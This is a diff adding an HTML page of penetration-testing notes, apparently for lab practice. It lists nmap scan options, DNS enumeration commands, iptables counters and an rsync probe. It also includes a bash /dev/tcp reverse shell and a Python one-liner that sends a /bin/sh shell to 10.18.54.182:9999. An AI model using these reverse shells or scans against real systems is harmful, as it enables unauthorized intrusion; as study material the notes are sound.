@@ -1,0 +1,74 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Host and Nmap</title>
+</head><body><b><br/>
+<img src="1.png" /><br/>
+<br/>
+nmap -Pn -sC -sV -oA tcp -p- -T4 -vvvvv --reason 192.168.210.90<br/>
+<br/>
+</b>rsync rsync://192.168.67.126/ &nbsp; <b><br/>
+</b><b><br/>
+</b><div style="text-align: left"><span style="font-size: 16pt"><span style="font-family: gg sans">txt,html,php,asp,aspx,jsp</span></span></div>&nbsp; <br/>
+<br/>
+<span style="font-family: Consolas"><span style="font-size: 13pt"><div style="text-align: left">sh -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</div></span></span>&nbsp; <br/>
+<b><br/>
+find / -type f -name local.txt<br/>
+<br/>
+python &nbsp;-c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.54.182",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'<br/>
+<br/>
+HOST<br/>
+</b>* host &lt;domain name&gt;<br/>
+* host -t mx &lt;domain name&gt;<br/>
+* host -t txt &lt;domain name&gt;<br/>
+<br/>
+* for ip in $(seq 200 250); do host 51.222.169.$ip; done | grep -v "not found"<br/>
+<br/>
+<b>DNSRECON<br/>
+</b>* dnsrecon -d &lt;domain name&gt; -t &lt;type of scan&gt; for ex: std<br/>
+<br/>
+* dnsrecon -d &lt;domain name&gt; -D ~/&lt;filename&gt; -t brt<br/>
+<br/>
+<b>DNSENUM<br/>
+</b>* dnsenum &lt;domain name&gt;<br/>
+<br/>
+<b>NSLOOKUP<br/>
+</b>* nslookup &lt;domain name&gt;<br/>
+<br/>
+* nslookup -type=TXT &lt;domain name&gt; &lt;ip address&gt;<br/>
+<br/>
+<b>IPTABLES<br/>
+</b>*sudo iptables -I INPUT 1 -s &lt;ip address&gt; -j ACCEPT<br/>
+<br/>
+*sudo iptables -I OUTPUT 1 -d &lt;ip address&gt; -j ACCEPT<br/>
+<br/>
+*sudo iptables -Z<br/>
+<br/>
+*sudo iptables -vn -L<br/>
+<br/>
+<b>NMAP<br/>
+</b><b>* </b>nmap &lt;ip-address&gt;<br/>
+* nmap -p &nbsp;1-100 &lt;ip address&gt;<br/>
+* nmap -sS &lt;ip address&gt; {SYN Scan}<br/>
+* nmap -sT &lt;ip address&gt; {TCP Connect Scan}<br/>
+* nmap -sU &lt;ip address&gt; {UDP Scan}<br/>
+* nmap -sS -sU &lt;ip address&gt; {SYN+UDP Scan}<br/>
+* nmap -sn &lt;ip adress-range from last octet) {network sweeping or host discovery}<br/>
+* nmap -v -sn &lt;ip adress-range&gt; -oG &lt;file name&gt;<br/>
+* grep Up &lt;file name&gt; | cut -d " " -f 2<br/>
+* nmap -p &lt;ip address-range&gt; -oG &lt;file name&gt;<br/>
+* grep open &lt;file name&gt; | cut -d " " -f 2<br/>
+* nmap -sT -A --top-ports=20 &lt;ip address-range&gt; -oG &lt;file name&gt;<br/>
+* nmap -O &lt;ip address&gt; --osscan-guess {OS SCAN}<br/>
+* nmap -sV -sT -A &lt;ip address&gt;<br/>
+* nmap --script http-headers &lt;ip address<br/>
+&gt;<br/>
+* nmap --script-help http-headers<br/>
+<br/>
+<b>FOR WINDOWS<br/>
+</b>* Test-NetConnection -Port 445 &lt;ip address&gt;<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
